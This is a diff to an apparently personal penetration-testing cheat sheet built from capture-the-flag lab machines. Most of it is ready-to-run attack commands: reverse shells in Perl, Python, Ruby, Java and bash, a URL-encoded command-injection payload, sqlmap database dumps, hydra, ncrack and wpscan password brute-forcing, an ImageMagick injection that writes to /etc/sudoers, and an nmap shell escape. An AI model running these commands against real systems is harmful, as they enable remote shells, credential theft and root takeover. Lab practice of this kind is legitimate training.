@@ -49,8 +49,8 @@ echo -n aW1mYWRtaW5pc3RyYXRvcg== | base64 -D >> flags.txt
 http://192.168.0.105/imfadministrator/uploads/6b26454f2373.gif?file=echo%20%E2%80%9Cbash%20-i%20%3E&%20/dev/tcp/192.168.0.104/1234%200%3E&1%E2%80%9D%20%3E%3E%20%20/tmp/hell
 echo "bash -i >& /dev/tcp/192.168.0.104/1234 0>&1" > ./hell
 host <ip>
-
-
+ sqlmap --url "http://nullbyte/kzMb5nVYJw/index.php" --data "usrtosearch=a" -D mysql --dump
+sqlmap --url "nullbyte/kzMb5nVYJw/420search.php?usrtosearch=a" --leve=2 -D seth -T users --dump --exclude-sysdbs
 cat /etc/services/<port number>
 curl 127.0.0.1:<port number>
 ltrace strings on binary
@@ -61,6 +61,7 @@ enumerate smb
 linenum very useful script
 linux system info/user info
 #######check out who owns what
+#
 /opt/misc/priv.py
 ##########POSt
 sqlmap -u http://192.168.0.108/login.php --data "user=abc&password=def&s=submit" --cookie PHPSESSID=2t5ncd6bdgpf1firgev29uebe3  --dump --level=5 --risk=3
@@ -78,7 +79,7 @@ curl -O 192.168.0.200:8000/<semaphore>
 notes use system program in a a script using the effective user id of the
 script 
 ##List Users
-wpscan -url <ip> --enumerate u
+wpscan -aurl <ip> --enumerate u
 exiftools <image file name>
 must add the below in order to install 
 plugin
@@ -214,6 +215,7 @@ ps aux > /tmp/ps2
 diff ps1 ps2
 ftp>!/bash/bash
 upload file to server with ^  ^
+mysql >\! <command>
 
 
 find -perm +6000 -type f 2>/dev/null
@@ -777,3 +779,33 @@ ___Nmap udp tcp Hammer time
 necro sudo nmap nmap -sU -sT -n -r -T4 necro -p-  
 
 tcpdump -i eth0 -vv | tee -a dump.txt
+decompress bz2 bzip2 -d <file>.bz2
+ncrack -T4 -v -user margo  -P $WORDLISTS/phpbb.txt gibson:22
+ sudo convert 'https://pwn.com"|echo '\''margo ALL=(ALL:ALL) ALL'\'' >> /etc/sudoers"' out.png
+___WPSCAN brute
+
+wpscan -u robot/wp-admin --wordlist fsocity.dic --username elliot
+++++++
+___________works with mr robot
+____old version nmap
+nmap --interactive
+at nmap prompt
+!sh
+uname -an; id
+check out new group
+_____hydra
+
+hydra nullbyte http-post-form "/kzMb5nVYJw/index.php:key=^PASS^&Login:invalid key" -l null -P $PASSLIST
+__HTML nmap
+xalan -html -in pegasus_arp_scan.xml -out pegasus_arp.html
+____________wireshark
+__reverse shells
+perl -e 'use Socket;$i="192.168.56.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ruby -rsocket -e'f=TCPSocket.open("192.168.56.1",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.56.1/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+xterm -display 192.168.56.1:1
